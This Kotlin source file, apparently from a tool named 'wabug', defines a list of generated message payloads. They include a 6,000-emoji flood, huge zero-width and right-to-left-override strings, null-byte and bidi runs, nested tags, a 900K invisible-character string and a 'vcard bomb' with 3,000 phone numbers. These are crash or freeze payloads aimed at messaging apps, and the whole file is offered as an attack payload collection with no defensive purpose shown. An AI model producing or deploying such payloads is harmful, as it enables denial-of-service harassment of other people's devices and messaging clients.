package com.example.wabug

object Payloads {
    data class P(val id: String, val label: String, val gen: () -> String)

    val ALL = listOf(
        P("emoji_flood", "emoji flood 6000", { "\uD83D\uDE00".repeat(6000) }),
        P("large_draft", "large draft 85K", { "A".repeat(85000) }),
        P("glitchdot", "glitchdot 50K", { "\u200B\u202E".repeat(25000) }),
        P("nullbyte_bidi", "nullbyte+bidi", { "\u0000\u202E".repeat(1024) }),
        P("nested_tags", "nested tags 1500", { "<a><b>".repeat(750) + "</b></a>".repeat(750) }),
        P("overflow", "overflow 900K", { "\u2063".repeat(900000) }),
        P("blank", "blank ZWSP", { "\u200B".repeat(5000) }),
        P("vcard_bomb", "vcard bomb", { vcard(3000) })
    )

    fun get(id: String) = ALL.firstOrNull { it.id == id }

    private fun vcard(n: Int): String {
        val b = StringBuilder()
        b.append("BEGIN:VCARD\nVERSION:3.0\nFN:X\n")
        repeat(n) { i -> b.append("TEL;TYPE=CELL:+62811000${"%04d".format(i % 10000)}\n") }
        b.append("END:VCARD")
        return b.toString()
    }
}
